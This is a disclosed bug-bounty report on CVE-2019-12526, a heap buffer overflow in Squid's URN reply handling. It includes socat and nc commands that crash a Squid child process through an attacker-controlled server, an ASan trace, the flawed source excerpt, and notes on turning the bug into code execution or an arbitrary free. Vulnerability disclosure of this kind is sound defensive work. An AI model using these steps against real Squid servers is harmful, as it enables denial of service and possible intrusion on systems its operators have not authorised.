# UrnState Heap Overflow

## Report Details
- **Report ID**: 824771
- **URL**: https://hackerone.com/reports/824771
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-03-19T17:10:18.236Z
- **Disclosed**: 2021-08-26T23:36:06.987Z

## Reporter
- **Username**: jeriko_one
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
## Summary:
When handling a URN Request an attacker controlled response can  cause Squid to overflow a heap buffer. The buffer exist within a struct so not only does it allow an attacker to overflow adjacent memory, but also control a pointer that follows the buffer enabling them to free arbitrary memory. Paired with the Cache Manager bypass that I reported earlier, an attacker will know which addresses are valid. This can lead to RCE and was stated in the serverity of the Squid announce. 

Squid Announce: http://www.squid-cache.org/Advisories/SQUID-2019_7.txt
Assigned CVE-2019-12526

## Steps To Reproduce:
You must add the following to your squid.conf to allow URN request

```
acl Safe_ports port 0
```

The squid child will crash even without Asan, but it'll automatically restart. You can check PIDs to confirm it did crash or you can build with ASan if you want to see the crash output. 

```
$ export CFLAGS="${CFLAGS} -fsanitize=address -g"
$ export CXXFLAGS="${CXXFLAGS} ${CFLAGS}"

$./configure
```

I would also set the following ASan flags
```
export ASAN_OPTIONS="detect_leaks=false abort_on_error=true"
```


1) Start Squid
```
./sbin/squid --foreground -d 100
```

1) Start a server that will output 4096 bytes
```
$ socat TCP-LISTEN:8080,fork SYSTEM:"python -c \'print\(\\\"A\\\" * 4096)\'"
```

2) Make a URN request to this server
```
$ echo -e "GET urn::@<attacker IP>:8080/ HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128

```

```
=================================================================
==4723==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000067958 at pc 0x7f0d8a44deed bp 0x7ffff8eef4b0 sp 0x7ffff8eeec58
WRITE of size 81 at 0x621000067958 thread T0
    #0 0x7f0d8a44deec  (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x9feec)
    #1 0x563906dc1389 in mem_hdr::copyAvailable(mem_node*, long, unsigned long, char*) const /home/j1/h4x/squid/releases/squid-4.8/src/stmem.cc:202
    #2 0x563906dc1f58 in mem_hdr::copy(StoreIOBuffer const&) const /home/j1/h4x/squid/releases/squid-4.8/src/stmem.cc:262
    #3 0x563906de76d7 in store_client::scheduleMemRead() /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:424
    #4 0x563906de6f0c in store_client::scheduleRead() /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:391
    #5 0x563906de691f in store_client::doCopy(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:352
    #6 0x563906de6082 in storeClientCopy2 /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:306
    #7 0x563906de4ac4 in storeClientCopyEvent /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:145
    #8 0x563906c3cc8e in EventDialer::dial(AsyncCall&) /home/j1/h4x/squid/releases/squid-4.8/src/event.cc:41
    #9 0x563906c3d7c6 in AsyncCallT<EventDialer>::fire() ../src/base/AsyncCall.h:145
    #10 0x563906fd75cd in AsyncCall::make() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCall.cc:40
    #11 0x563906fd90b5 in AsyncCallQueue::fireNext() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCallQueue.cc:56
    #12 0x563906fd8bfc in AsyncCallQueue::fire() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCallQueue.cc:42
    #13 0x563906c3e8ac in EventLoop::dispatchCalls() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:144
    #14 0x563906c3e42e in EventLoop::runOnce() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:109
    #15 0x563906c3e052 in EventLoop::run() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:83
    #16 0x563906d35a0e in SquidMain(int, char**) /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1709
    #17 0x563906d34102 in SquidMainSafe /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1417
    #18 0x563906d3404f in main /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1405
    #19 0x7f0d89723eaa in __libc_start_main (/lib64/libc.so.6+0x23eaa)
    #20 0x563906ae3b59 in _start (/home/j1/h4x/squid/debug/squid-4.8/sbin/squid+0x484b59)

0x621000067958 is located 0 bytes to the right of 4184-byte region [0x621000066900,0x621000067958)
allocated by thread T0 here:
    #0 0x7f0d8a4c59ae in __interceptor_calloc (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x1179ae)
    #1 0x563907343217 in xcalloc /home/j1/h4x/squid/releases/squid-4.8/compat/xalloc.cc:83
    #2 0x56390731d954 in MemPoolMalloc::allocate() /home/j1/h4x/squid/releases/squid-4.8/src/mem/PoolMalloc.cc:35
    #3 0x563907317412 in MemImplementingAllocator::alloc() /home/j1/h4x/squid/releases/squid-4.8/src/mem/Pool.cc:204
    #4 0x563906b62af5 in cbdataInternalAlloc(int, char const*, int) /home/j1/h4x/squid/releases/squid-4.8/src/cbdata.cc:238
    #5 0x563906e36d1c in UrnState::operator new(unsigned long) /home/j1/h4x/squid/releases/squid-4.8/src/urn.cc:32
    #6 0x563906e344c1 in urnStart(HttpRequest*, StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/urn.cc:211
    #7 0x563906c609cb in FwdState::Start(RefCount<Comm::Connection> const&, StoreEntry*, HttpRequest*, RefCount<AccessLogEntry> const&) /home/j1/h4x/squid/releases/squid-4.8/src/FwdState.cc:373
    #8 0x563906bac622 in clientReplyContext::processMiss() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:783
    #9 0x563906bb947e in clientReplyContext::doGetMoreData() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1855
    #10 0x563906bb76d1 in clientReplyContext::identifyFoundObject(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1707
    #11 0x563906bae43c in clientReplyContext::created(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:937
    #12 0x563906dc96e7 in StoreEntry::getPublicByRequest(StoreClient*, HttpRequest*) /home/j1/h4x/squid/releases/squid-4.8/src/store.cc:524
    #13 0x563906bb716e in clientReplyContext::identifyStoreObject() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1667
    #14 0x563906bb8cab in clientGetMoreData /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1813
    #15 0x563906bead08 in clientStreamRead(clientStreamNode*, ClientHttpRequest*, StoreIOBuffer) /home/j1/h4x/squid/releases/squid-4.8/src/clientStream.cc:182
    #16 0x563906bd20c6 in ClientHttpRequest::httpStart() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1542
    #17 0x563906bd1c94 in ClientHttpRequest::processRequest() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1528
    #18 0x563906bd528d in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1896
    #19 0x563906bcc18a in ClientRequestContext::clientAccessCheckDone(allow_t const&) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:830
    #20 0x563906bcacf5 in ClientRequestContext::clientAccessCheck2() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:729
    #21 0x563906bd383f in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1781
    #22 0x563906bcc18a in ClientRequestContext::clientAccessCheckDone(allow_t const&) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:830
    #23 0x563906bcae38 in clientAccessCheckDoneWrapper /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:741
    #24 0x563906f171b9 in ACLChecklist::checkCallback(allow_t) /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:169
    #25 0x563906f15b23 in ACLChecklist::completeNonBlocking() /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:54
    #26 0x563906f17c5b in ACLChecklist::nonBlockingCheck(void (*)(allow_t, void*), void*) /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:257
    #27 0x563906bca91a in ClientRequestContext::clientAccessCheck() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:709
    #28 0x563906bd3255 in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1753
    #29 0x563906bc87b9 in ClientRequestContext::hostHeaderVerify() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:600

SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x9feec) 
Shadow bytes around the buggy address:
  0x0c4280004ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4280004ee0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4280004ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4280004f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4280004f10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c4280004f20: 00 00 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa
  0x0c4280004f30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4280004f40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4280004f50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4280004f60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4280004f70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==4723==ABORTING
```

## Analysis

When handling an URN request from a user Squid makes a request to the remote
server to retrieve a list of URLs. The response is handled via urnHandleReply.

The response from the server is buffered into urnState->reqbuf as Squid reads
data in. This buffer is of length URN_REQBUF_SZ 4096

urnHandleReply can be called into multiple times as it waits for
urlres_e->store_status != STORE_PENDING and the current offset into reqbuf
held by urnState->reqofs is less than URN_REQBUF_SZ.

```
    if (urlres_e->store_status == STORE_PENDING &&
            urnState->reqofs < URN_REQBUF_SZ) {
        tempBuffer.offset = urnState->reqofs;
        tempBuffer.length = URN_REQBUF_SZ;
        tempBuffer.data = urnState->reqbuf + urnState->reqofs;
        storeClientCopy(urnState->sc, urlres_e,
                        tempBuffer,
                        urnHandleReply,
                        urnState);
        return;
    }
```
urnHandleReply will prepare a StoreIOBuffer object filling it with urnState
buffer, reqofs, and how the length.

Unfortunately this tempBuffer has the total length of urnState->reqbuf
URN_REQBUF_SZ, instead of the amount of data that is left. Whenever the
response is being copied a second time into the buffer it can overflow. The 
attacker can control how much is overflowed by adjusting the response.

## Impact

This overflow has 2 useful features for someone trying to exploit Squid. The
first obvious one being overflowing into an adjacent memory region. An
attacker that was able to align the heap in such a way that a virtual table
pointer was after the urnState object could gain control of the instructor
pointer, thus, gaining control of the Squid process.

The second is that before urnState overflows into that adjacent object it will
overflow the pointer urlres within itself. This pointer later is free'd. An
attacker with knowledge of current addresses in Squid could use this to
trigger a Use-After-Free.

## Attachments
No attachments
